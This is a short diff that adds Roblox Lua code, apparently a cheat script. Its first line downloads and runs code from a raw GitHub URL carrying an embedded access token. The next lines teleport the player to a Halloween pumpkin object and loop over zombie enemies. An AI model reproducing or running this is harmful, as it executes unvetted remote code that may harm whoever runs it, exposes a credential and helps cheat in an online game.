@@ -1,1 +1,10 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/PotatoEiii/delcoolgate/refs/heads/main/qwetqw42?token=GHSAT0AAAAAACRR6GOCC55JKCGQIBCRDRZIZYIZGMA'))()
+
 local a = game:GetService("Workspace").WorldEvent.Halloween.Pumpkin
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = a.CFrame
+
+                for _,v in pairs(game.Workspace.Enemies:GetChildren()) do
+if string.find(v.Name, "Zom") then
+print("hello")
+end
+end
